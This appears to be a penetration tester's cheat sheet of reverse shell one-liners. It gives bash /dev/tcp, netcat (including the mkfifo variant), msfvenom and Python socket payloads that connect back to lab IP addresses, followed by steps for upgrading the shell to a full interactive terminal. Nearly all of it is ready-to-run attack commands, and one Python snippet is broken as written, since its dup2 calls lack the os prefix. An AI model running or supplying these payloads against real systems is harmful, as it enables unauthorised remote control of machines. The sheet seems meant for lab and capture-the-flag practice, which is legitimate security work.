### Bash:

```bash
bash -c 'bash -i >& /dev/tcp/10.8.6.108/9001 0>&1'
```
### NC:

```bash
nc -e bash 10.8.6.108 443
busybox nc 10.8.6.108 443 -e sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.6.108 443 >/tmp/f
```
### NC - MSFVenom

```bash
sudo msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.127 lport=4444 R
```
### Python:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Python - No OS:

```bash
import socket
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.71",7777))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn(["/bin/bash"])
s.close()
```
### Sort out terminal

#### Local system:

```bash
garffff@garffff:~$ echo $TERM
xterm-256color
garffff@garffff:~$ stty -a
speed 38400 baud; rows 55; columns 238; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```
#### Python

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
#### Using script command

```bash
script /dev/null -c /bin/bash
CTRL-Z
stty raw -echo; fg
reset
screen
export SHELL=bash
export TERM=xterm-256color
stty columns 238 rows 55
```